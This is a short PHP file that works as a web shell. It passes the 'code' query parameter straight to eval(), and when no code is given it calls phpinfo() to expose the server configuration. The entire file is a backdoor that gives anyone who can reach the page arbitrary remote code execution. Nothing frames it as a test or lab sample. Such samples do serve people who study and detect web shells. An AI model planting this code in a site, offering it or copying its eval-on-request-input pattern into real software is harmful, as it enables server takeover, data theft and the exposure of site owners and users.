<?php
if($_GET['code'])
{
  eval($_GET['code']);
}
else 
{
  phpinfo();
}

